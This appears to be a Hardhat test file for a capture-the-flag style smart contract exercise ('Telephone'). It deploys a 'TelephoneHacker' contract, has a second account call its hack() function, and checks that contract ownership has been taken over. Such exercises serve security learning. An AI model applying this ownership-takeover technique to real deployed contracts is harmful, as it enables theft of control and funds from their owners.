import { loadFixture, ethers, expect } from "../setup";

describe("Telephone", function() {
    async function deploy() {
        const [owner, other_addr] = await ethers.getSigners();

        const Factory = await ethers.getContractFactory("Telephone");
        const contract = await Factory.deploy();
        await contract.waitForDeployment();

        const Factory2 = await ethers.getContractFactory("TelephoneHacker");
        const contractHacker = await Factory2.deploy();
        await contractHacker.waitForDeployment();

        return { owner, other_addr, contract, contractHacker }
    }

    it("become an owner", async function() {
        const { owner, other_addr, contract, contractHacker } = await loadFixture(deploy);
    
        // Check initial owner
        expect(await contract.owner()).to.equal(owner.address);

        // Call proxy function
        await contractHacker.connect(other_addr).hack(
            await contract.getAddress(),
            other_addr.address
        )
        // Send some eth to the contract
        //await other_addr.sendTransaction({ to: await contract.getAddress(), value: ethers.parseEther('0.0001') })


        // Check new owner
        expect(await contract.owner()).to.equal(other_addr.address);
    });

});